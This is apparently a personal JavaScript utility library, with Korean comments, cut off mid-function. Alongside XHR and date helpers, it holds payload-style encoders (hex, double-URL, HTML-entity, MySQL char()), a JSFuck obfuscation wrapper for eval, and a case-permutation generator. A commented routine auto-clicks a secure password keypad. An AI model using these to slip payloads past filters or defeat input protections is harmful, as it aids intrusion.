/*
<script charset="UTF-8" src="/MyLibraryAndTools/my_js/packages/MySet.js"></script>
<script charset="UTF-8" src="/MyLibraryAndTools/my_js/packages/MyLibrary.js"></script>
*/



document = window.document
window.my = {} 
var MyLibrary = {
	f_script_wirte_s: (srcs) => { // MyLibrary.f_script_wirte_s(['https://localhost:8080/MyLibraryAndTools/my_js/파일.js','/MyLibraryAndTools/my_js/파일.js','파일.js'])
		scripts = ''
		for (src of srcs) {
			scripts += `<script src=${src} charset="UTF-8"></script>`
		}

		document.write(
			document.documentElement.outerHTML.replaceAll(new RegExp('</html>', 'g'), `${scripts}</html>`)
		)
	},
	f_script_write: (string) => { // MyLibrary.f_script_write(`<script> 형식으로 작성 ㄱ </script>`)
		if (typeof string === 'string') {
			document.write(
				document.documentElement.outerHTML.replaceAll(new RegExp('</html>', 'g'), `${string}</html>`)
			)
		}
	},

	"ObjectManager": {
	
		setObjPropsToObj: (fromObj , toObj)=>{
			for(key in fromObj){
				console.log(key)
				toObj[key]={}    
			}
		},
		setObjRecursivePropsToObj: (fromObj , toObj)=>{ // 자식 키들까지 모두 적용시킴

		}

	},

	f_check_valid: (obj) => { // f_check_valid(객체) 를 할 때 객체가 아예없으면 에러남. 때문에 typeof obj !== 'undefined' 는 아무런 의미 없음.   // || ( obj instanceof Array && obj.length > 0 )
		if (
			(typeof obj === 'number' && !isNaN(obj)) || typeof obj !== 'undefined' && obj !== undefined && obj !== null && obj !== '' && obj !== false && obj.length !== 0
			|| (obj instanceof Array && obj.length > 0) /* 객체 길이검증 로직 찾아서 포함해야됨 */ 
			|| (typeof a === 'string' && a !== 'null') 
		) return true;
		else return false
	},

	f_set_base_send_querystring: () => { // MyLibrary.f_set_base_send_querystring();
		window.base_send_querystring = `location_href=${encodeURIComponent(location.href)}&my_screen_size_width_height=true&my_init=true`

		if (MyLibrary.f_check_valid(window.my_login_platform)) window.base_send_querystring += `&my_login_platform=${window.my_login_platform}`
		if (MyLibrary.f_check_valid(window.my_run_mode)) window.base_send_querystring += `&my_run_mode=${window.my_run_mode}`
		if (MyLibrary.f_check_valid(window.my_browser_id)) window.base_send_querystring += `&my_browser_id=${"'" + window.my_browser_id + "'"}`
		if (MyLibrary.f_check_valid(window.my_id)) window.base_send_querystring += `&my_id=${window.my_id}`

		return window.base_send_querystring
	},

	f_result_filter: (string) => { // 파일소스코드 내용을 1줄로 반환. //주석 모두지움 등.. '변수=값;if(){..};function f(){..};'
		//  /확장정규식/g 는 new RegExp('확장정규식','g') 랑 다름.
		var result_filter = string.replaceAll(new RegExp('(\/\/.*|;)', 'g'), '').replaceAll(/\/\*[\s\S]*?\*\//g, '')  // /* \r\n\t 주석 내용 \r\n\t*/ 을 지움.  
		result_filter = result_filter.replaceAll(new RegExp('\r\n', 'mg'), ';').replaceAll(new RegExp(';+', 'g'), ';').replaceAll(new RegExp('^;', 'g'), '')
		result_filter = result_filter.replaceAll(/ *; */g, ';').replaceAll(/( *= *)/g, '=')

		return result_filter;
	},
	f_get_value: (result_filter, key) => {
		// 제대로 파싱이 계속 안될 시 new Function(result_filter)(); 후 window.키 로 접근 ㄱ
		// MyLibrary.f_get_value(MyLibrary.f_result_filter(e.currentTarget.result) , "my_id")

		// \'|\"
		v_value = result_filter.replaceAll(new RegExp(`.*(window.)?${key} *= *`, `mg`), '').split(';')[0] // "값" 또는 조건 ? "true일떄":false일떄반환
		if (v_value.match(/^['"`].+['"`]$/g)) {
			v_value = v_value.replaceAll(/(^['"`]|['"`]$)/g, '')
		}
		return v_value;
	},
	f_set_key_value: (param_result_filter, param_key, param_value) => {
		/*
			MyLibrary.f_set_key_value(
				MyLibrary.f_result_filter(fileReader.result),'키',값
			)
		*/
		// \'|\"
		param_key = `window.${param_key}`
		set_key_value = ''
		if (!param_result_filter.match(new RegExp(`${param_key}=`, 'g'))) { // 키 없을 떄 추가
			set_key_value = param_result_filter;
			set_key_value += `${param_key}=${param_value};`
			return set_key_value; // 반환하므로 함수종료
		}


		for (var key_value of param_result_filter.split(';')) { // 키가 있다면 함수종료안되므로 실행됨.
			//console.log(`key_value=${key_value}`)
			key = key_value.split('=')[0]
			value = key_value.split('=')[1]
			//console.log(`key = ${key}\nvalue = ${value}`)

			if (key.match(new RegExp(`${param_key}`, 'g'))) {
				key_value = key_value.replaceAll(value, param_value)
			}

			if (MyLibrary.f_check_valid(key_value)) {
				key_value += ';'
				set_key_value += key_value;
			}

		}

		return set_key_value;
		//return result_filter.replaceAll(new RegExp(`.*(window.)?${key} *= *`, `mg`), '').split(';')[0]
	},

	f_random: (min, max) => {
		return Math.round(
			Math.random() * (min - max)
		) + max
	},
	f_thread_sleep: (ms) => { // MyLibrary.f_thread_sleep(window.my_ms);alert('이후에실행됨')
		const date_now_add_ms = Date.now() + ms;
		while (Date.now() < date_now_add_ms) { }

	},
	f_settimeout: (callback_arr, ms, ms_interval) => {
		// f_settimeout([()=>{alert(1);},()=>{alert(2);},()=>{alert(3);}],3000,3000) 
		// 1. 함수를 2. 초후에 호출함 3. 2 += 3 초 후에 1을 호출함
		for (var my_callback of callback_arr) {
			setTimeout(() => {
				my_callback()
			}, ms)
			if (f_check_valid(ms_interval)) ms += ms_interval
		}
	},

	f_simpledateformat: function timestamp() { // yyyy-MM-dd HH:mm:ss 반환
		var date = new Date();
		date.setHours(date.getHours() + 9);
		return date.toISOString().replace('T', ' ').substring(0, 19);
	},
	f_datetime_to_number: (p1_datetime) => { // yyyy-MM-dd HH:mm:ss yyyy-MM-dd ~ yyyy-MM-dd ...
		return parseInt(p1_datetime.replaceAll(/([\.: \-~]|(오전|오후))/g, ''))
	},
	f_replace_datetime: (my_오픈대기) => { // MyLibrary.f_replace_datetime(window.my_오픈대기); 'yyyy.MM.dd HH:mm' 일 시 'yyyy-MM-dd HH:mm:ss' 로 반환.
		result = my_오픈대기.replaceAll('.', '-') //'yyyy-MM-dd HH:mm'
		if (!MyLibrary.f_check_valid(result)) return '';


		date = result.split(' ')[0]// 'yyyy-MM-dd'
		time = result.split(' ')[1] // 'HH:mm'

		if (!MyLibrary.f_check_valid(time)) {
			time = '00:00:00'
		}


		HH_mm_ss = time.split(':') // ['HH','mm']
		if (HH_mm_ss.length === 1) { // ['HH'] 일 시 
			result += ':00:00'
		} else if (HH_mm_ss.length === 2) { // ['HH','mm'] 일 시 ':00' 붙여줌
			result += ':00'
		}

		return result;
	},

	f_replace_ms_yyyyMMddHHmmss: (ms) => { // MyLibrary.f_replace_ms_yyyyMMddHHmmss(new Date("yyyy-MM-dd HH:mm:ss").getTime() - ms초);
		let date = new Date(ms);
		let yyyy = date.getFullYear();
		let MM = ("0" + (date.getMonth() + 1)).slice(-2);
		let dd = ("0" + date.getDate()).slice(-2);
		let HH = ("0" + date.getHours()).slice(-2);
		let mm = ("0" + date.getMinutes()).slice(-2);
		let ss = ("0" + date.getSeconds()).slice(-2);

		return `${yyyy}-${MM}-${dd} ${HH}:${mm}:${ss}`;
	},
	init: (window) => { // 기본적으로 무조건 호출하고 다른 객체|메소드들 호출해야됨.
		//console.log("this.document >> " + document)
	},
	Base: {

		// 공통적인것들 정리

		xmlHttpRequest: (param1) => {

			if (!param1 || param1 === "-h" || param1 === "--help") {
				console.log(
					`	
					window.param1 = {}		
					window.param1.method = "POST"
					window.param1.url = location.protocol + "//" + location.hostname + ":" + location.port + "/MyLibraryAndTools/my_java/packages/ExtendsHttpServlet" //protocol://hostname:port/pathname?name=value&searchparam#hash 
					window.param1.send_querystring = ""  //?name=value&param=value
					window.param1.setRequestHeader = '요청-헤더: 값\n요청-헤더: 속성키=속성값\n'
					window.param1.setRequestHeader = '응답-헤더: 값\n응답-헤더: 속성키=속성값\n' // 내 서버측에서만 응답헤더 설정하는거임.
					window.param1.async = "false"  //true<비동기>또는false<동기>
					window.param1.withCredentials = "true"  //true<cors 일 떄 쿠키 보냄>또는false<안보냄> 
					//window.param1.responseType = "text" //text또는document등..   
					window.param1.done_2xx_callback = ()=>{
						console.log('200 정상응답') 
						//readyState === DONE && status === 2xx && 수행될 콜백함수
					}
					
					MyLibrary.Base.xmlHttpRequest( window.param1 )
				`
				)
				return "param1 없음"
			}

			xmlHttpRequest = new XMLHttpRequest()
			xmlHttpRequest.open(
				param1.method || "POST",
				param1.url || "http://127.0.0.1:8080/",
				param1.async === "true" ? true : false
			)


			xmlHttpRequest.withCredentials = param1.withCredentials === "true" ? true : false


			if( !MyLibrary.f_check_valid(param1.setRequestHeader)){  
				window.xmlHttpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded;charset=utf-8')
				window.xmlHttpRequest.setRequestHeader('Accept', 'text/html;charset=utf-8')
			}else{ // 요청-헤더: 값\n요청-헤더: 속성키=속성값\n  

				for (var request_header of param1.setRequestHeader.split('\n')) {
					if (request_header !== '') {
						//console.log(`${request_header.split(':')[0]}:${request_header.split(':')[1]}`)
						window.xmlHttpRequest.setRequestHeader(request_header.match(/.+(?=: )/)[0], request_header.match(/(?<=: ).+/)[0])
						//console.log(request_header.match(/.+(?=: )/)[0]+": " + request_header.match(/(?<=: ).+/)[0])  
					}

				}
			}

			//window.xmlHttpRequest.responseType = param1.responseType || 'text'
			if(param1.setResponseHeader !== ''){
				if(param1.send_querystring === ''){
					param1.send_querystring="my_set_response_header="+param1.setResponseHeader
				}else if(param1.send_querystring !== ''){
					param1.send_querystring+="&my_set_response_header="+param1.setResponseHeader
				}
			}

			xmlHttpRequest.addEventListener('readystatechange', (event) => {
				switch (xmlHttpRequest.readyState) {
					case XMLHttpRequest.UNSENT:
						console.log('XMLHttpRequest.UNSENT = ' + XMLHttpRequest.UNSENT)
						break;

					case XMLHttpRequest.OPENED:
						console.log('XMLHttpRequest.OPENED = ' + XMLHttpRequest.OPENED)
						break;

					case XMLHttpRequest.HEADERS_RECEIVED:
						console.log('XMLHttpRequest.HEADERS_RECEIVED = ' + XMLHttpRequest.HEADERS_RECEIVED)

						console.log(window.xmlHttpRequest.getAllResponseHeaders())


						break;

					case XMLHttpRequest.LOADING:
						console.log('XMLHttpRequest.LOADING = ' + XMLHttpRequest.LOADING)
						break;

					case XMLHttpRequest.DONE:
						//console.log('XMLHttpRequest.DONE = ' + XMLHttpRequest.DONE)  
						switch (window.xmlHttpRequest.status) {
							case 200:
								if (param1.done_2xx_callback) {
									param1.done_2xx_callback()
								} else {
									console.log('200 ok window.xmlHttpRequest.responseText = ' + window.xmlHttpRequest.responseText)
								}
								break;
							case 302:
								console.log(`302 Moved temporary`)

							case 404:

								console.log('404 Not Found')
								break;
							case 500:

								console.log('500 server error')
								break;
						}

						break;

					default:
						console.log('default')
						break;
				}  
			});

			if (param1.send_querystring !== "") {
				xmlHttpRequest.send( param1.send_querystring ); 
			} else {
				xmlHttpRequest.send(); 
			}
			return xmlHttpRequest;
		}
	},

	imageCharCodeAtToString16: (img_src) => {
		window.top.my_img_chars = ''

		for (var char of atob(img_src.split(/.+;base64,/img)[1])) window.top.my_img_chars += char.charCodeAt().toString(16) + ' ';

		window.top.my_img_chars_arr = window.top.my_img_chars.split(' ')

		return window.top.my_img_chars;
	},

	imageWidthHeightPixelChange: (img, width, height) => {
		if (f_check_valid(img)) {
			if (typeof img === "object" && img.nodeType === Node.ELEMENT_NODE) {
				if (f_check_valid(width) && f_check_valid(height)) {
					img.width = width;
					img.height = height;
				} else if (f_check_valid(width)) {
					img.width = width;
				} else {
					console.error('width 값이 존재하지 않습니다.')
				}
			}

			if (typeof img === 'string') { // '이미지주소라면'
				var img_element = document.createElement('img')
				img_element.src = img //img태그의src 주소값으로 설정   
				if (f_check_valid(width) && f_check_valid(height)) {
					img_element.width = width;
					img_element.height = height;
				} else if (f_check_valid(width)) {
					img_element.width = width;
				} else {
					console.error('width 값이 존재하지 않습니다.')
				}
				return img_element;
			}

		} else {
			console.error('image 가 존재하지 않습니다.');
		}
	},

	Css: {
		tag_style_change: (element, css_value) => {
			//엘리먼트.style+='css속:값;'은 안됨. style 자체가 객체임. 
			var style_value = ''
			if (f_check_valid(element) && element.nodeType === window.Node.ELEMENT_NODE && f_check_valid(element.style)) {
				for (var key of element.style) {
					console.log(element.style[key])
					style_value += key + ":" + element.style[key] + ';'
				}
				if (f_check_valid(css_value)) {
					console.log(style_value + css_value)
					element.style = style_value + css_value
				}
			}
			return style_value + css_value
		}
	},

	Transkey: {
		// 동적 엘리 생성 , 동적 라이브러리 로딩 등..   
		init: () => {
			//자동라이브러리 호출 , initTranskey()
		},
		create_elem_attr_even: (element_name, attributes, parent_element, event_name, event_value) => {
			//f_create_element_setattribute("생성할 엘리 이름" , ["속성 = 값","속성 = 값"] , 부모엘리 ,'이벤트이름','이벤트수행명령어')
			var element = document.createElement(element_name)
			for (var v of attributes) element.setAttribute(v.split('=')[0], v.split('=')[1])
			if (f_check_valid(parent_element)) parent_element.appendChild(element)

			if (f_check_valid(event_name) && f_check_valid(event_value)) {
				element.addEventListener(event_name, (e) => {
					eval(event_value)
				})
			}


			/*
			
			function mtranskey_input(str){
				if(document.querySelector('div[id="mtk_pwd2"]') !== undefined){
					for(var char of str){
						console.log(char)
						//숫자키패드만 됨
						document.querySelector(`div[class="dv_transkey_div_2 dv_transkey_div2_Height"] a[aria-label="${char}"]`).click()
					}
				}
			}
			
			*/


			return element;
		},
		createBaseInput: (form) => {
			input = create_elem_attr_even('input', ["data-tk-kbdType=qwerty"], event_name = 'click', event_value = 'tk.onKeyboard(event.currentTarget)')
			if (f_check_valid(form)) {
				form.appendChild(input)
			} else {
				form = create_elem_attr_even('form', ['id=form_id', 'method=post', 'action=index_WS.jsp'], event_name = 'submit', event_value = 'tk.fillEncData()')
			}


		},
		setAttributeAndEvents: (attri) => {



		}
	},

	MTranskey: {
		init: () => {
			//자동라이브러리 호출 , initmTranskey()
		},

		Css: {
			KeyPadeTransparentColor: (input_id) => {
				input = document.querySelector('#' + input_id)
				input.addEventListener('focus', (event) => {
					window.settimeout = setTimeout(() => {
						document.querySelector('div[id=mtk_disp]').style.cssText += 'background-color:rgba(0,0,0,0.0)'
					}, 500)
				})
			}
		}
	},

	Nxkey: {
		init: () => {
			// 자동라이브러리 호출 , TK_Loading()    

		}
	},
	Ksbiz: {
		init: () => {
			// 자동라이브러리 호출 , TK_Loading()    

		}
	},

	Mvaccine: {
		init: () => {

		},



	}

}





var MyBase = {
/* 
	만들어야 될것들 : 
		

*/
	Table: {
		'STRING': {
			'BINS': [],'OCTS': [], 'DECS': [],'HEXS': [],'CHARS': [], 'HTMLS': [], 'ESCAPE_HTML':[],'UTF8S': []
		}
	},
	range:(i,j,k)=>{
		k = k || window.undefined;
		var result=[] , index=0; 
		if(k == window.undefined){
			for(i; i<=j; i++) result[index++]=i;  
			return result;   
		} else {
			for(i; i<=j; i+=k) result[index++]=i;
			return result;
		}
	},
	
	getAsciiTable:()=>{
		for(var i=0;i<128;i++){
			result.STRING.CHARS[i] = String.fromCharCode(i)
			result.STRING.HEXS[i] = "0x"+parseInt(i,16)
			result.STRING.DEC[i] = "0d"+i 
			
			result.STRING.OCTS[i] = "0o"+parseInt(i,8)
			result.STRING.BINS[i] = "0b"+parseInt(i,2)
			if( i >= 32 ) result.STRING.HTMLS[i] = "&#${i}"
			else result.STRING.HTMLS[i] = ''
		}
		return result;
	},
	
	getEncodeHtmlTable: ()=>{
		result={}
		result.STRING
		for(var i=0;i<128;i++){
			result.STRING.ESCAPE_HTML+=escapeHTML(String.fromCharCode(i))
		}
	},
	getUniUTF8Table:{
		
	},
	
	
	getListToStr: function(list){ //MyBase.getgetListToStr(MyBase.range(48,57))
		var result=""    
		for(var ch of list) result+=String.fromCharCode(ch);   
		return result
	},
	getStrToDecodeUri: function(url){ 
		// ( url | uri ) 있는지 검증 후 uri 디코딩 시킨 것만 반환.
		var decode_Uri='';
		url = url.match( new RegExp(/(http[s]?|.*\?.+=.+)+.+/,'img') )
		if(url != window.undefined){
			
			for(var key in url) decode_Uri+=decodeURIComponent(url[key])+"\n";   	
			
		} 
		return decode_Uri;
	},
	getStrToHexStr : (str)=>{
		var ret="";   
		for(var i=0;i<str.length;i++) ret+="\\x"+str.charCodeAt(i).toString(16); 
		return ret;   
		
	},
	getStrToHexUrlEncode : (str)=>{
		return MyBase.getStrToHexStr(str).replaceAll(/\\x/img,'%');  	
	},
	getStrToHexUrlEncode25 : (str)=>{ // %가 또 한번 인코딩되는. %가 %25 로 치환됨  
		return MyBase.getStrToHexUrlEncode(str).replace('%','%25');  
	},
	getStrToHexConsole : (str)=>{
		return MyBase.getStrToHexStr(str).replaceAll(/\\/img,'0');
	},
	getStrToHexNum : (str)=>{
		return MyBase.getStrToHexStr(str).replaceAll(/\\x/img,'');
	},
	getStrToHexUni16:function(str){
		var ret="";
		for(var i=0;i<str.length;i++){
			if(str.charCodeAt(i) <= 127){
				ret+="\\u00"+str.charCodeAt(i).toString(16) ; 
			} else if(str.charCodeAt(i) > 127){
				ret+="\\u"+str.charCodeAt(i).toString(16) ; 
			}
		}
		//ret=ret.substring(ret.length-1,1);
		return ret;
		
	},
	getStrToHexUni32:function(str){
		var ret="";
		for(var i=0;i<str.length;i++){
			ret+="\\u{"+str.charCodeAt(i).toString(16)+"}" ; 
		}
		//ret=ret.substring(ret.length-1,1);
		return ret;
	},
	
	getStrToDecimal:(str)=>{
		let result="";
		for(let i of str){
			result+=i.charCodeAt().toString(10)
		}
		return result
	},
	
	getStrToDecimalURL:(str)=>{
		let result="";
		for(let i of str){
			result+="%"+i.charCodeAt().toString(10)
		}
		return result
	},
	        
	getStrToHTML_ascii10:(str)=>{
		let result="";
		for(let i of str){
			result+="&#"+i.charCodeAt().toString(10)
		}
		return result;     
	},
	getStrToHTML_ascii16:(str)=>{
		let result="";
		for(let i of str){
			result+="&#x"+i.charCodeAt().toString(16)
		}
		return result;
	},
	getUrlToSplitLocation:(url)=>{
		//https://www.google.com/search?q=asdffdsa&oq=asdffdsa&aqs=chrome..69i57.1181j0j7&sourceid=chrome&ie=UTF-8
		var protocol = "" 
		if(url.match(new RegExp(/.+:\/\//,'img'))){
			protocol = url.match(new RegExp(/.+:\/\//,'img'))[0].replace("://","");
			console.log("protocol => " + protocol );
			localStorage.setItem('protocol', protocol)
			
		}
					
		
		var hostname = "" 
		if(url.match(new RegExp(/:\/\/.+\//,'img'))){
			hostname = url.match(new RegExp(/:\/\/.+\//,'img'))[0].replace(/(\/|:)/img,"");
			console.log('hostname => ' + hostname);
			localStorage.setItem('hostname', hostname)
		}
		
		var port = ""
		if(hostname.match(new RegExp(/.+:\d{1,5}/,"img"))){
			port = hostname.match(new RegExp(/.+:\d{1,5}/,"img"))[0].replace(".+:","");
			console.log("port => " + port)
			localStorage.setItem('port', port)
		}
		
		var origin = ""
		if(protocol != "" && hostname != ""){ 
			origin = protocol + hostname
			console.log("origin" + origin)
			localStorage.setItem('origin', origin)
		}
		
		
		var pathname = ""
		if(origin != ""){
			pathname = url.replace(origin,"")
			console.log("pathname =>" + pathname)
			localStorage.setItem('pathname', pathname)
		}
		
		var search = ""
		if(url.match(new RegExp(/\?.+/,'img'))){   
			search = url.match(new RegExp(/\?.+/,'img'))[0]
			console.log("search =>" + search)
			localStorage.setItem('search', search)    
		}
		
		for(var i = 0;i < localStorage.length; i++){
			console.log(`${localStorage.key(i)} : ${localStorage.getItem(localStorage.key(i))}`)
		}
	}
	,
	
	
	getCodeString: (str)=>{
		let result=""
		for(let i in str){
			result+=String.fromCharCode(
				str.charCodeAt(i)
			)
		}
		return result;
	},
	getStrToCRLFurl: (str)=>{
		// 거의 처음부터라고 생각하고 다시 짤 것.
		//str = str.replaceAll("\\","%"+"%".charCodeAt(0).toString(16))
			
		var list = ["\\r","\\n","\\s","\\t",":","<","/",">","(",")","[","]"]
		for(let char of list){
			str = str.replaceAll(char,"%"+"%".charCodeAt(0).toString(16) + char.charCodeAt(0).toString(16) )
		}
		alert(str)
		/*str = str.replaceAll("\\r","%"+"%".charCodeAt(0).toString(16) + "0"+"\r".charCodeAt(0).toString(16) )
		str = str.replaceAll("\\n","%"+"%".charCodeAt(0).toString(16) + "0"+"\n".charCodeAt(0).toString(16) )
		*/
		
	},
	getReplaceNewLineHTML : (str) => { // 모두 1줄로 된 js코드 난독화
		console.log("google 에 Deobfuscate 검색 ㄱ ")
		// document.documentElement.innerHTML = MyBase.getReplaceNewLineHTML(document.documentElement.innerHTML)
		result=""; tab_curr="&nbsp;&nbsp;"; tab="&nbsp;&nbsp;"
		for(var c of str){
			if(c == "<" || c == ">") {
				continue;   
			}
			if(c == "{"){ 
				c="{<br/>"+tab
				
				tab_curr+=tab;
			}
			if(c == "}"){ 
				c="<br/>}<br/>"
					
				tab_curr = tab_curr.substr(tab)
			}
			if(c == ";") c=";<br/>" + tab_curr 
				
			result+=c;
		}
		
		return result;  
	},
	
	encode: (charset,str)=>{
		if(MyLibrary.f_check_valid(charset) && charset =='ms949' || charset == 'MS949' ){	
			console.log(charset + ' 은 지원안함.')
			return null;
		}
		
		return new TextEncoder(charset).encode(str)
	},
	decode: (charset,str)=>{
		if(MyLibrary.f_check_valid(charset) && charset =='ms949' || charset == 'MS949' ){	
			console.log(charset + ' 은 지원안함.')
			return null;
		}
		return new TextDecoder(charset).decode(str)
	},
	
	
	
	getStrToBin: (str)=>{
		result=""
		for(var i=0;i<str.length;i++){
			result+=str.charCodeAt(i).toString(2);
		}
		return result
	},
	getStrToBinConsole: (str)=>{
		return '0b'+MyBase.getStrToBin(str);
	},
	getStrToBinFromCharCode:(str)=>{
		result=""
		for(var i=0;i<str.length;i++){  
			result+="0b"+str.charCodeAt(i).toString(2) + ",";  
		}
		result=result.replace(/,$/,'')
		return result
	},
	getStrToBinMySql: (str)=>{
		result=""
		for(var i=0;i<str.length;i++){  
			result+="b"+"'"+str.charCodeAt(i).toString(2)+"'" + ",";    
		}
		result=result.replace(/,$/,'')
		return result
	},
	
	getStrToOct: (str)=>{
		result=""
		for(var i=0;i<str.length;i++){  
			result+=str.charCodeAt(i).toString(8);
		}
		return result
	},
	
	getStrToOctConsole: (str)=>{
		return '0o'+MyBase.getStrToOct(str);
	},
	getStrToOctFromCharCode: (str)=>{
		result=""
		for(var i=0;i<str.length;i++){  
			result+="0o"+str.charCodeAt(i).toString(8) + ",";
		}
		result=result.replace(/,$/,'')
		return result
	},
	
	getStrToHex: (str)=>{
		result=""
		for(var i=0;i<str.length;i++){  
			result+=str.charCodeAt(i).toString(16);
		}
		return result
		
	},
	getStrToHexConsole: (str)=>{
		return '0x'+MyBase.getStrToHex(str); 
	},
	getStrToHexFromCharCode: (str)=>{
		result=""
		for(var i=0;i<str.length;i++){  
			result+="0x"+str.charCodeAt(i).toString(16) + ",";
		}
		result=result.replace(/,$/,'')
		return result
	},
	getStrToHexMySql: (str)=>{
		result=""
		for(var i=0;i<str.length;i++){  
			result+="x"+"'"+str.charCodeAt(i).toString(16)+"'" + ",";
		}
		result=result.replace(/,$/,'')
		return result
	},
	
	getStrToDecimalMySql: (str)=>{
		result=""
		for(var i=0;i<str.length;i++){  
			result+=str.charCodeAt(i).toString(10)+ ",";
		}
		result=result.replace(/,$/,'')
		return result
	},
	
	
	getStrToObfuscationJSCode: (js_code)=>{ // MyBase.getStrToObfuscationJSCode('자바스크립트코드');
		/* 
			eval(`${MyBase.getStrToObfuscationJSCode('자바스크립트코드')}`);  //''또는""또는`` 안에 있어도 되고 없어도 정상수행됨 됨. 즉 문자열 아니어도 됨
			new Function(`'${MyBase.getStrToObfuscationJSCode('자바스크립트코드')}'`)();
		*/ 
		if(MyLibrary.f_check_valid(JSFuck)){   
			return JSFuck.encode(js_code/* 자바스크립트코드 작성 ㄱ; eval(jscode); 자체를 변환 시 콘솔에 바로 복붙해도 돌아감. 문자열x*/ , true /*eval , Function 으로 실행*/, true /* 실행할게 안에 부모 스코프로 */);
			/* 
				JSFuck.encode 호출 시 아래와 같이 치환됨 
				false       =>  ![]
				true        =>  !![]
				undefined   =>  [][[]]
				NaN         =>  +[![]]
				0           =>  +[]
				1           =>  +!+[]
				2           =>  !+[]+!+[]
				10          =>  [+!+[]]+[+[]]
				Array       =>  []
				Number      =>  +[]
				String      =>  []+[]
				Boolean     =>  ![]
				Function    =>  []["filter"]
				eval        =>  []["filter"]["constructor"]( CODE )()
				window      =>  []["filter"]["constructor"]("return this")()
				로 치환시키는
			*/
			
			
		}else{ 
			//MyLibrary.f_script_wirte_s(['/MyLibraryAndTools/my_js/data_analysis/jsfuck.js']);
			console.error('/MyLibraryAndTools/my_js/data_analysis/jsfuck.js 로드 안됨. https://jsfuck.com/ 접속해서 확인 ㄱ.')
		}
		
		return '';
	},  
	
	getStrToLowerOrUpper:(str , downgrade)=>{  // 2. 문자열길이 * 문자열 길이 시 너무 오래걸려서 다운그레이드. 높을 수록 연산시간 단축. 
		arr=[]; arr.push(str.toLowerCase());   
		sub_length = downgrade || 1;  
		
		if(MyLibrary.f_check_valid(str) && str.length > 0){  
			
			for(var arr_index=0;arr_index < (str.length - sub_length); arr_index++){ // 너무 오래걸려서 줄임.
			//for(var arr_index=0;arr_index < (str.length * str.length); arr_index++){ //문자열의2승만큼 반복해야됨
			
				for(var i=0;i<str.length;i++){    
					char_10 = str[i].charCodeAt()  
					if(char_10 >= 97 && char_10 <= 122){ //lower  
						str = str.replace(str[i] , str[i].toUpperCase())
						if(!arr.includes(str)) arr.push(str)	  	 					
						

					}else if(char_10 >= 65 && char_10 <= 90){ //upper
						str = str.replace(str[i] , str[i].toLowerCase())  
						if(!arr.includes(str)) arr.push(str)
						
					}else{ 
						if(!arr.includes(str)) arr.push(str)  
					}  
				}  
				 
				if(arr_index < arr.length){     
					arr_str = str.split('')    
					arr_str[arr_index] = arr[arr_index][arr_index] // ab 일 시 Abc aBc abC ABc ABC  	
					str = arr_str.join('') 
				}
			}  
		} 
		
		arr.push(str.toUpperCase());  
		return arr.join('\n') 
		
/* 
abc
Abc
ABc
ABC
AbC
aBc
aBC
abC
ABC	
*/
	},
	getStrForm: function(str){
		var ret=""; var result="";
		try{
			/*
			for(var i=0;i<str.length;i++){
				ret+="\\x"+str.charCodeAt(i).toString(16); 
			}
			*/
			
			my_result_or_string='\n\n\t또는\n\n\t'
			
			result+="{" 
			
			result+="\n\t\"BINARRY\": " + "\"" + MyBase.getStrToBin(str) + "\"" + ','
			result+="\n\t\"BINARRY-CONSOLE\": " + "\"" +MyBase.getStrToBinConsole(str) + "\"" + ','
			result+="\n\t\"BINARRY-FROMCHARCODE\": " + "\"" 
				+ `\n\t` + `String.fromCharCode(${MyBase.getStrToBinFromCharCode(str)});`
				+ `${my_result_or_string}` + "select cast(char(" +  MyBase.getStrToBinFromCharCode(str) + ") as character); " 
				+ `${my_result_or_string}` + "String.format(\"%c%c..개수만큼\"," + MyBase.getStrToBinFromCharCode(str) + "); "   
			+ "\n\t\"" + ','  
			result+="\n\t\"BINARRY-MYSQL\": " + "\"" + "select cast(char(" +  MyBase.getStrToBinMySql(str) + ") as character);" + "\"" + ','  
			
			
			  
			
			result+="\n\t\"OCTAL\": " + "\"" + MyBase.getStrToOct(str) + "\"" + ','
			result+="\n\t\"OCTAL-CONSOLE\": " + "\"" +MyBase.getStrToOctConsole(str) + "\"" + ','
			result+="\n\t\"OCTAL-FROMCHARCODE\": " + "\"" 
				+ "String.fromCharCode("+MyBase.getStrToOctFromCharCode(str)+"); " 
			+ "\n\t\"" + ','   // String.fromCharCode(여기에 " 는 지우고 값 복붙 ㄱ)
			
			result+="\n\t\"DECIMAL\": " + "\"" + MyBase.getStrToDecimal(str) + "\"" + ','
			result+="\n\t\"DECIMAL-URL\": " + "\"" + MyBase.getStrToDecimalURL(str) + "\"" + ','
			result+="\n\t\"DECIMAL-URI\": " + "\"" + MyBase.getStrToDecodeUri(str) + "\"" + ','
			result+="\n\t\"DECIMAL-MYSQL\": " + "\"" 
				+ "select cast(char(" +  MyBase.getStrToDecimalMySql(str) + ") as char);" 
			+ "\n\t\"" + ','   
			   
			 
			
			result+="\n\t\"HEX\": " + "\"" + MyBase.getStrToHex(str) + "\"" + ','
			result+="\n\t\"HEX-CONSOLE\": " + "\"" +MyBase.getStrToHexConsole(str) + "\"" + ','
			result+="\n\t\"HEX-FROMCHARCODE\": " + "\"" 
				+ `\n\t` + "String.fromCharCode("+MyBase.getStrToHexFromCharCode(str)+");" + my_result_or_string 
				+ `${my_result_or_string}` + "select cast(char(" +  MyBase.getStrToHexFromCharCode(str) + ") as character);"  + my_result_or_string
				+ `${my_result_or_string}` + "String.format(\"%c%c..개수만큼\"," + MyBase.getStrToHexFromCharCode(str) + "); "  
				
			+ "\n\t\"" + ','  
			
			result+="\n\t\"HEX-MYSQL\": " + "\"" + "select cast(char(" +  MyBase.getStrToHexMySql(str) + ") as character);" + "\"" + ','  
			
			result+="\n\t\"HEX-STR\": "+ "\"\n\t" 
				+ "console.log(\"" + MyBase.getStrToHexStr(str) +"\");"  
			+ "\n\t\"" + ',';
			
			result+="\n\t\"HEX-URLENCODE\": "+ "\"" + MyBase.getStrToHexUrlEncode(str) + "\"" + ',';
			
			result+="\n\t\"HEX-URLENCODE25\": "+ "\"" + MyBase.getStrToHexUrlEncode25(str) + "\"" + ',';
			
			
			result+="\n\t\"HEX-CONSOLE\": "+ "\"" + MyBase.getStrToHexConsole(str) + "\"" + ',';
			result+="\n\t\"HEX-NUM\": "+ "\"" + MyBase.getStrToHexNum(str) + "\"" + ',';     
			result+="\n\t\"HEX-UNI16\": " + "\"" 
				+ "console.log(\"" + MyBase.getStrToHexUni16(str) +"\");" 
			+ "\"" + ','      
			result+="\n\t\"HEX-UNI32\": " + "\"" 
				+ "console.log(\"" + MyBase.getStrToHexUni32(str) +"\");" 
			+ "\"" + ','
			
